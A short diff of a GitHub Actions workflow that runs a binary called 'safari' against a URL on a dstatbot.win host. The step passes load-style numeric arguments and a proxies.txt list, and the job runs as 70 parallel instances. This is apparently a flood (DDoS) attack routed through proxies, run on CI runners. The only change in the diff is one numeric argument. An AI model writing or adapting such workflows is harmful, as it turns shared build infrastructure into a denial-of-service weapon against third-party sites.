@@ -58,7 +58,7 @@ jobs:
           
           echo "=== Starting Execution ==="
           # 5. Run the binary and force error output stream redirection
-          ./safari https://c1.dstatbot.win/lURlGPR6 700 1000 90 proxies.txt --raw 2>&1
+          ./safari https://c1.dstatbot.win/lURlGPR6 700 1000 1 proxies.txt --raw 2>&1
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70
